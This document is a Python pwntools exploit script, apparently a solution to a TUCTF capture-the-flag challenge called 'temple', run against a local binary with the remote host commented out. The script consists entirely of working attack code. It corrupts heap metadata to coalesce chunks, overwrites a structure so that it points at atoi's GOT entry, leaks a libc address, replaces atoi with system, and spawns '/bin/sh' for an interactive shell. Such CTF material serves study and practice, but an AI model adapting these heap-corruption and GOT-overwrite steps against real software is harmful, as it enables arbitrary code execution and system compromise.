from pwn import *

# Run process
context.arch = 'amd64'
binary = ELF("./temple")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = process(['./temple'])
#r = remote('temple.tuctf.com',4343)



# Wait for debugger
"""
pid = util.proc.pidof(r)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)
"""


def take_wisdom(i):
    r.recvuntil("Your choice:")
    r.sendline('1')
    r.sendline(str(i))
    log.info("take_wisdom "+str(i))

def give_wisdom(length, wisdom):
    r.recvuntil("Your choice:")
    r.sendline('2')
    r.sendline(str(length))
    r.sendline(wisdom)
    log.info("give_wisdom: ("+str(length)+","+wisdom+")")

def rethink_wisdom(i, wisdom):
    r.recvuntil("Your choice:")
    r.sendline('3')
    r.sendline(str(i))
    r.sendline(wisdom)
    log.info("rethink_wisdom: ("+str(i)+","+wisdom+")")
    

# Overwrite wisdom
got_atoi = binary.got["atoi"]
libc_system = libc.symbols["system"]
libc_atoi = libc.symbols["atoi"]

atoi_system_offset = libc_system - libc_atoi















# Free 2 blocks
take_wisdom(4)
take_wisdom(6)

# Use two blocks
give_wisdom(32,"A"*32)
rethink_wisdom(8,"R"*32+"\x30")

# Coalesce
take_wisdom(7)

# Reuse  wisdom
give_wisdom(100,"B"*99)

# Overwrite wisdom
rethink_wisdom(8, pack(8) + pack(got_atoi) + pack(8) + pack(0x00401c80))

# Leak atoi
r.recvuntil("Your choice:")
r.sendline('1')
r.clean(2)
r.sendline("9")
binary_atoi = unpack(r.recv(8))
print(hex(binary_atoi))

binary_system = binary_atoi + atoi_system_offset


##############################################################

# Free 2 blocks
take_wisdom(0)
take_wisdom(2)

# Use two blocks
give_wisdom(32,"A"*32)
rethink_wisdom(10,"R"*32+"\x30")

# Coalesce
take_wisdom(3)

# Reuse  wisdom
give_wisdom(100,"B"*99)

# Overwrite wisdom
rethink_wisdom(10, pack(8) + pack(got_atoi) + pack(8) + pack(0x00401c80))

# Write system
rethink_wisdom(11,pack(binary_system))


r.sendline("/bin/sh")

r.interactive()
